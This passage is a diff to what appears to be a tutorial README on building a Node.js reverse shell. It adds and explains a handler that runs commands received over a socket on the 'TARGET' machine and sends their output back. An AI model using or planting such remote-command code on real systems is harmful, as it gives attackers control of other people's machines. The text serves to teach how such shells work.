@@ -97,6 +97,73 @@ And once the connection as been established, I will see "_Connected_" \n "_$>_" 
 
 ![](connected_reverse_shell.png)
 
+### Ok good, we have a connection. Now what?
+Now we implement the code that will make our TARGET do something when it receives the commands.
+
+I used: `lient.on("data", FUNCTION )`
+
+What this function does is specifying what the client will do when it will receive data. The passed data is defined as `"data"`and the `FUNCTION` is the action the TARGET will do.
+
+
+```
+
+client.on("data", (data)=>{  
+
+  
+    let cmd = (data.toString().trimEnd()); 
+
+    let args = cmd .split(" "); 
+    
+    let exec = child_process.spawn(args[0],args.slice(1)); //args.slice(1) elimina il primo elemento del vettore
+
+    exec.stdout.on("data", (out) =>{
+
+        client.write(out);
+        client.write("$> ");
+    })
+
+
+})
+```
+
+#### Let's break it down.
+
+`let cmd = (data.toString().trimEnd()); `
+
+Here i define `cmd` as the command that is passed. the method `toString()` is used to convert the bufferized hex that arrives into a string of character.
+
+The method `trimEnd()` cuts the last character since it is a CR LF char and could mess up with the command we want to send.
+
+
+`let args = cmd .split(" ");` here i define `args` as an array of all the commands + flags that are sent. The divisor is the space.
+
+`let exec = child_process.spawn(args[0],args.slice(1));` This is the heart of our code. This method makes the command executable on the TARGET machine.
+
+
+>child_process.spawn(command[, args][, options]).
+As [**node.js** documentation states:](https://nodejs.org/api/child_process.html#child_processspawncommand-args-options) 
+>The child_process.spawn() method spawns a new process using the given command, with command-line arguments in args. If omitted, args defaults to an empty array.
+
+In our code, `args[0]` is the command we want to execute, from `args[1]` there are just flags. `args.slice[1]` takes the `args[]` vector from the 1st element, not the 0th.
+
+
+To conclude, we make the client  output the result of our command. Alway using ".on"
+
+```
+    exec.stdout.on("data", (out) =>{
+
+        client.write(out);
+        client.write("$> ");
+    })
+    
+````
+
+## An example
+
+![](connected_reverse_shell.png)
+
+
+
 
 
 
